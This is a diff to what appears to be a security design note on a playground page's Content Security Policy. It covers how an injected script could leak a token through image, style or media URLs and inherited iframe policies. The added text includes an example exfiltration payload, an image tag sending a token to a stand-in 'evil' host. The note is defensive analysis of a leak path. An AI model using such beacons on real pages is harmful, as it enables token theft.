@@ -262,8 +262,13 @@ beacon, a form, a frame, an object, a worker or a script from another host.
 It can still send it as the URL of an image, a style sheet or a media file: the
 preview frames are `srcdoc` iframes, which inherit the page's policy, so
 `img-src`, `media-src`, `style-src` and `font-src` must allow the https images,
-style sheets and media a deck links. Closing those routes needs the preview
-served from a URL of its own.
+style sheets and media a deck links. A preview served from a URL of its own
+(the only kind of frame that gets a policy of its own: `blob:` and `data:`
+frames inherit too, measured in Chrome) would not close them: the page hands
+that frame the deck, and a script injected into the page can hand it
+`<img src="https://evil/?t=TOKEN">` as well. Also open whatever the policy
+says: top-level navigation, `window.open` (`navigate-to` shipped in no
+browser) and, in part, DNS prefetch (`x-dns-prefetch-control: off`).
 `gitvm_test.go` (`TestPlaygroundPageCSP`), `browsertest/csp.cjs` and
 `browsertest/git.cjs` sweep every store, message and request for the token and
 probe the policy. A script injected into the page itself could still read the
